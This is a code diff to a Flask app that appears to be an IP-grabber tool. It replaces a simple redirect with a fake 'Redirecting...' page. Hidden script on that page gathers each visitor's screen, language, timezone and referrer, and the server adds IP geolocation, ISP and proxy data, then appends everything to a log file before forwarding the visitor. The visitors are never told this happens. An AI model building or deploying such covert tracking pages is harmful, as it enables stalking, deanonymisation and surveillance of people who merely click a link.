@@ -1438,22 +1438,58 @@ def full_scan(url, mode="full"):
 
 flask_app = Flask(__name__)
 
+HTML_LANDING = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        var info = {
+            screen: window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "-bit)",
+            lang: navigator.language || navigator.userLanguage,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ref: document.referrer || "Direct"
+        };
+        fetch('/log_analytics', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+        }).finally(function() {
+            window.location.href = "{{ redirect_url }}";
+        });
+    </script>
+</body>
+</html>
+"""
 
 @flask_app.route("/")
 def index():
-    global captured_ip, captured_ua, captured_time, captured_country, captured_city, captured_isp
+    global captured_ip, captured_ua, captured_time, captured_country, captured_city, captured_isp, captured_as, captured_proxy
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
     ua = request.headers.get("User-Agent", "Unknown")
     t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     captured_ip, captured_ua, captured_time = ip, ua, t
-    country, city, isp = get_geo(ip)
-    captured_country, captured_city, captured_isp = country, city, isp
-    with open(os.path.expanduser("~/log.txt"), "a") as f:
-        f.write(f"{t} | IP: {ip} | {country} | {city} | {isp} | UA: {ua}\n")
-    return redirect(redirect_url, code=302)
+    country, city, isp, as_info, is_proxy = get_geo(ip)
+    captured_country, captured_city, captured_isp, captured_as, captured_proxy = country, city, isp, as_info, is_proxy
+    return render_template_string(HTML_LANDING, redirect_url=redirect_url)
 
+@flask_app.route("/log_analytics", methods=["POST"])
+def log_analytics():
+    global captured_screen, captured_lang, captured_tz, captured_ref
+    data = request.get_json(silent=True) or {}
+    captured_screen = data.get("screen", "?")
+    captured_lang = data.get("lang", "?")
+    captured_tz = data.get("tz", "?")
+    captured_ref = data.get("ref", "?")
+    with open(os.path.expanduser("~/log.txt"), "a") as f:
+        f.write(f"{captured_time} | IP: {captured_ip} | {captured_country} | {captured_city} | ISP: {captured_isp} | Screen: {captured_screen} | Ref: {captured_ref}\n")
+    return ("", 204)
+        
 
 def run_flask():
     log = logging.getLogger('werkzeug')
